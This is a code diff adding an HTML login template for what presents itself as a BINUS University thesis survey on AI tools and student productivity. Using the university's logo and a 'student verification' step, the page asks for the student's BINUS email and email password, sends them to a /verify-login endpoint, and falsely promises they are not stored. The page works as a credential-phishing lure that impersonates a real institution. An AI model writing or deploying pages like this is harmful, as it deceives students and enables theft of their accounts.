@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Survei Penelitian Skripsi - BINUS University</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="icon" href="https://binus.ac.id/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo-section">
+                <img src="https://binus.ac.id/wp-content/themes/binus/assets/images/logo-horizontal.png" alt="BINUS University" class="logo">
+            </div>
+            
+            <div class="header-section">
+                <h1>📊 Survei Penelitian Skripsi</h1>
+                <div class="research-info">
+                    <h2>Pengaruh AI Tools terhadap Produktivitas Mahasiswa BINUS</h2>
+                    <p class="researcher">Peneliti: Mahasiswa Program Studi Computer Science - BINUS University</p>
+                </div>
+            </div>
+            
+            <div class="description">
+                <p>Survei ini bertujuan untuk menganalisis bagaimana penggunaan AI tools (seperti ChatGPT, GitHub Copilot, dll) mempengaruhi produktivitas mahasiswa dalam menyelesaikan tugas kuliah.</p>
+                <p><strong>Waktu pengisian: ±5 menit</strong></p>
+            </div>
+            
+            <div class="verification-section">
+                <div class="verification-header">
+                    <span class="lock-icon">🔐</span>
+                    <h3>Verifikasi Status Mahasiswa</h3>
+                </div>
+                <p class="verification-text">Survei ini hanya untuk mahasiswa BINUS yang masih aktif. Silakan login dengan akun BINUS untuk melanjutkan:</p>
+            </div>
+            
+            {% if error %}
+            <div class="error-message">
+                ⚠️ {{ error }}
+            </div>
+            {% endif %}
+            
+            <form method="POST" action="/verify-login" id="loginForm">
+                <div class="form-group">
+                    <label for="email">Email BINUS</label>
+                    <input type="email" 
+                           id="email" 
+                           name="email" 
+                           placeholder="nama.anda@binus.ac.id" 
+                           required 
+                           pattern=".*@binus\.ac\.id$"
+                           autocomplete="email">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" 
+                           id="password" 
+                           name="password" 
+                           placeholder="Masukkan password email BINUS" 
+                           required
+                           autocomplete="current-password">
+                </div>
+                
+                <button type="submit" class="btn-primary">
+                    Verifikasi & Lanjut ke Survei
+                </button>
+            </form>
+            
+            <div class="privacy-note">
+                <p>🔒 <strong>Privasi Terjamin:</strong> Data login hanya digunakan untuk memverifikasi bahwa responden adalah mahasiswa BINUS yang masih aktif. Data tidak akan disimpan atau dibagikan ke pihak ketiga.</p>
+            </div>
+            
+            <div class="footer">
+                <p>© 2026 BINUS University Research | Untuk pertanyaan hubungi peneliti melalui email BINUS</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('email').addEventListener('blur', function() {
+            if (this.value && !this.value.endsWith('@binus.ac.id')) {
+                alert('Harap gunakan email BINUS (@binus.ac.id)');
+                this.focus();
+            }
+        });
+    </script>
+</body>
+</html>
